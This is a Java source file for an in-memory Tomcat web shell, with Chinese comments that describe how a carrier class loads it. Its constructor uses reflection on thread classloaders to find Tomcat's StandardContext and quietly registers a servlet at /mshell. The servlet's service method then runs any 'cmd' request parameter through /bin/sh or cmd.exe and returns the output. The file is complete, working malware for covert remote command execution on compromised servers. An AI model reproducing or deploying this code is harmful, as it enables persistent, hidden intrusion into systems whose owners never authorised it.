import javax.servlet.Servlet;
import javax.servlet.ServletConfig;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;

/**
 * Installer —— 最简 Tomcat Servlet 内存马（无第三方依赖，仅编译期需要 servlet-api）。
 *
 * 运行方式：
 *   被载体类 jar:file:...!/Exception 通过 defineClass 定义，
 *   再由载体构造器 newInstance()，构造器里完成注册。
 *
 * 注册流程：
 *   1. findContext()：遍历所有线程的 TCCL，找 *WebappClassLoader*，
 *      反射 resources -> context，拿到 Tomcat 的 StandardContext；
 *   2. createWrapper() -> setName -> setServlet(this) -> setLoadOnStartup(1)
 *      -> addChild(Container) -> addServletMappingDecoded("/mshell", name)；
 *   3. 访问 /mshell?cmd=id 时，service() 执行 /bin/sh -c <cmd> 并把输出写回。
 *
 * 注意：
 *   - 编译目标必须是 Java 8（与载体一致）；
 *   - 编译时需要 javax.servlet-api（只在编译期用，运行期由 Tomcat 提供）；
 *   - 路径 /mshell 由 mshell.sh 通过 sed 替换成你要的路径。
 */
public class Installer implements Servlet {

    public Installer() {
        install();
    }

    private void install() {
        try {
            Object ctx = findContext();
            if (ctx == null) {
                System.out.println("[mshell] context not found");
                return;
            }
            String name = "msx" + System.nanoTime();

            Object wrapper = ctx.getClass().getMethod("createWrapper").invoke(ctx);
            wrapper.getClass().getMethod("setName", String.class).invoke(wrapper, name);
            Class.forName("org.apache.catalina.Wrapper")
                    .getMethod("setServlet", Servlet.class).invoke(wrapper, this);
            wrapper.getClass().getMethod("setLoadOnStartup", int.class).invoke(wrapper, 1);
            ctx.getClass().getMethod("addChild", Class.forName("org.apache.catalina.Container"))
                    .invoke(ctx, wrapper);

            try {
                ctx.getClass().getMethod("addServletMappingDecoded", String.class, String.class)
                        .invoke(ctx, "/mshell", name);
            } catch (NoSuchMethodException e) {
                ctx.getClass().getMethod("addServletMapping", String.class, String.class)
                        .invoke(ctx, "/mshell", name);
            }
            System.out.println("[mshell] installed at /mshell");
        } catch (Throwable t) {
            t.printStackTrace();
        }
    }

    /**
     * 遍历线程，找 Tomcat 的 webapp ClassLoader：
     *   TCCL 类名匹配 .*WebappClassLoader.*
     *   -> 字段 resources（StandardRoot）
     *   -> 字段 context（StandardContext）
     */
    private Object findContext() {
        for (Thread t : Thread.getAllStackTraces().keySet()) {
            ClassLoader cl = t.getContextClassLoader();
            if (cl == null) {
                continue;
            }
            if (!cl.getClass().getSimpleName().matches(".*WebappClassLoader.*")) {
                continue;
            }
            try {
                Object resources = getField(cl, "resources");
                if (resources != null && resources.getClass().getName().endsWith("Root")) {
                    return getField(resources, "context");
                }
            } catch (Throwable ignored) {
                // 继续找下一个线程
            }
        }
        return null;
    }

    private static Object getField(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != null && clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(name);
    }

    // ---------------- Servlet ----------------

    @Override
    public void init(ServletConfig config) {
    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public String getServletInfo() {
        return "mshell";
    }

    @Override
    public void destroy() {
    }

    @Override
    public void service(ServletRequest req, ServletResponse res) throws IOException {
        String cmd = req.getParameter("cmd");
        res.setContentType("text/plain;charset=UTF-8");
        PrintWriter writer = res.getWriter();
        if (cmd == null || cmd.isEmpty()) {
            writer.println("mshell ok");
            writer.flush();
            return;
        }
        try {
            boolean win = System.getProperty("os.name", "").toLowerCase().contains("win");
            String[] argv = win
                    ? new String[]{"cmd.exe", "/c", cmd}
                    : new String[]{"/bin/sh", "-c", cmd};
            Process process = new ProcessBuilder(argv).redirectErrorStream(true).start();
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
            String line;
            while ((line = reader.readLine()) != null) {
                writer.println(line);
            }
            process.waitFor();
        } catch (Exception e) {
            e.printStackTrace(writer);
        }
        writer.flush();
    }
}
